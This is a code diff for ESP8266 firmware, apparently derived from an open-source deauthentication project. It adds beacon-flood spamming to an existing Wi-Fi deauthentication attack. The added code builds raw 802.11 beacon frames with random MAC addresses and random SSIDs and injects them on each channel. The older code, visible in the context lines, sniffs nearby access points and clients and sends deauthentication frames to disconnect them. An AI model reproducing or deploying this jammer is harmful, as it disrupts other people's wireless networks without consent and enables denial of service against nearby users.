@@ -1,4 +1,5 @@
 // based on RandDruid/esp8266-deauth (MIT) https://github.com/RandDruid/esp8266-deauth
+// inspired by kripthor/WiFiBeaconJam (no license) https://github.com/kripthor/WiFiBeaconJam
 // requires SDK v1.3: install esp8266/Arduino from git and checkout commit 1c5751460b7988041fdc80e0f28a31464cdf97a3
 
 // Expose Espressif SDK functionality
@@ -25,9 +26,27 @@ uint8_t packet_buffer[64];
 // DeAuth template
 uint8_t template_da[26] = {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x6a, 0x01, 0x00};
 
+// beacon template
+uint8_t template_beacon[128] = { 0x80, 0x00, 0x00, 0x00, 
+                /*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
+                /*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
+                /*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 
+                /*22*/  0xc0, 0x6c, 
+                /*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
+                /*32*/  0x64, 0x00, 
+                /*34*/  0x01, 0x04, 
+                /* SSID */
+                /*36*/  0x00, 0x06, 0x72, 0x72, 0x72, 0x72, 0x72, 0x72,
+                        0x01, 0x08, 0x82, 0x84,
+                        0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 
+                /*56*/  0x04};  
+
 uint8_t broadcast1[3] = { 0x01, 0x00, 0x5e };
 uint8_t broadcast2[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };
 uint8_t broadcast3[3] = { 0x33, 0x33, 0x00 };
+
+// character map
+String charmap = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
 
 struct beaconinfo
 {
@@ -310,7 +329,7 @@ struct sniffer_buf2 {
 };
 
 
-/* Creates a packet.
+/* Creates a deauthentication packet.
 
    buf - reference to the data array to write packet to;
    client - MAC address of the client;
@@ -337,6 +356,33 @@ uint16_t create_packet(uint8_t *buf, uint8_t *c, uint8_t *ap, uint16_t seq)
   return 26;
 }
 
+/* Creates a randomized beacon packet.
+
+   chann - beacon channel
+
+   Returns: size of the packet
+*/
+uint16_t create_random_beacon(uint8_t chann)
+{
+  template_beacon[10] = template_beacon[16] = random(0xFF);
+  template_beacon[11] = template_beacon[17] = random(0xFF);
+  template_beacon[12] = template_beacon[18] = random(0xFF);
+  template_beacon[13] = template_beacon[19] = random(0xFF);
+  template_beacon[14] = template_beacon[20] = random(0xFF);
+  template_beacon[15] = template_beacon[21] = random(0xFF);
+
+  template_beacon[38] = charmap[random(65)];
+  template_beacon[39] = charmap[random(65)];
+  template_beacon[40] = charmap[random(65)];
+  template_beacon[41] = charmap[random(65)];
+  template_beacon[42] = charmap[random(65)];
+  template_beacon[43] = charmap[random(65)];
+
+  template_beacon[56] = chann;
+  
+  return 57;
+}
+
 /* Sends deauth packets. */
 void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
 {
@@ -347,6 +393,13 @@ void deauth(uint8_t *c, uint8_t *ap, uint16_t seq)
     wifi_send_pkt_freedom(packet_buffer, sz, 0);
     delay(1);
   }
+}
+
+void random_beacon(uint8_t chann)
+{
+  uint16_t sz = create_random_beacon(chann);
+  wifi_send_pkt_freedom(template_beacon, sz, 0);
+  delay(1);
 }
 
 void promisc_cb(uint8_t *buf, uint16_t len)
@@ -404,6 +457,7 @@ void loop() {
         wifi_promiscuous_enable(0);
         wifi_set_promiscuous_rx_cb(0);
         wifi_promiscuous_enable(1);
+        
         for (int ua = 0; ua < aps_known_count; ua++) {
           if (aps_known[ua].channel == channel) {
             for (int uc = 0; uc < clients_known_count; uc++) {
@@ -420,11 +474,14 @@ void loop() {
         wifi_promiscuous_enable(0);
         wifi_set_promiscuous_rx_cb(promisc_cb);
         wifi_promiscuous_enable(1);
-
+        
         channel++;
         if (channel == 15) break;
         wifi_set_channel(channel);
       }
+       
+      random_beacon(channel);
+      
       delay(1);
 
       if ((Serial.available() > 0) && (Serial.read() == '\n')) {
